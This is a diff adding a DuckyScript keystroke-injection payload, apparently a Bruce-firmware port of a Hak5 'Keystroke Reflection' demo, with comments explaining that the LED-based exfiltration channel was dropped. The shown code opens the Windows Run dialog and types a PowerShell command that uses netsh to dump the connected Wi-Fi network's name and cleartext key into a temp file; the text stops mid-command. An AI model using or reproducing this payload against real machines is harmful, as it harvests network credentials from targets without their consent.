@@ -1,0 +1,27 @@
+REM [Bruce compat rewrite] This is a Hak5 "Keystroke Reflection" exfil demo:
+REM the core technique depends on the USB Rubber Ducky's own firmware
+REM capability to read HID-OUT keyboard-LED reports back from the host
+REM (SAVE_HOST_KEYBOARD_LOCK_STATE / $_EXFIL_MODE_ENABLED /
+REM WAIT_FOR_SCROLL_CHANGE / RESTORE_HOST_KEYBOARD_LOCK_STATE, plus
+REM ATTACKMODE and LED_* status indicators). Bruce's ducky_typer.cpp
+REM implements none of that — it cannot read HID-OUT reports at all, so
+REM there is no compatible substitute for the actual exfil channel, only
+REM syntax cleanup for it. Reproducing the covert-channel logic would mean
+REM writing new firmware-level capability from scratch, not converting
+REM syntax (same situation as the EXTENSION-dependent files, see
+REM depende_de_extension/README.md).
+REM What IS kept below: the two PowerShell one-liners that dump the
+REM Wi-Fi profile key and re-encode it into %{CAPSLOCK}/%{NUMLOCK}
+REM SendKeys codes — these run standalone on the target regardless of
+REM whether anything reads the resulting keystrokes back. The final
+REM SendKeys playback (the actual reflection back to the Ducky) has no
+REM receiver on Bruce and was removed, since typing it would just send
+REM meaningless CAPSLOCK/NUMLOCK key events to the target with nothing on
+REM the Bruce side listening.
+REM Example Simple Keystroke Reflection Attack for Windows
+REM Saves currently connected wireless LAN profile to DUCKY
+
+REM Store the currently connected WiFi SSID & Key to %tmp%\z
+GUI r
+DELAY 100
+STRING powershell "netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>$env:tmp\
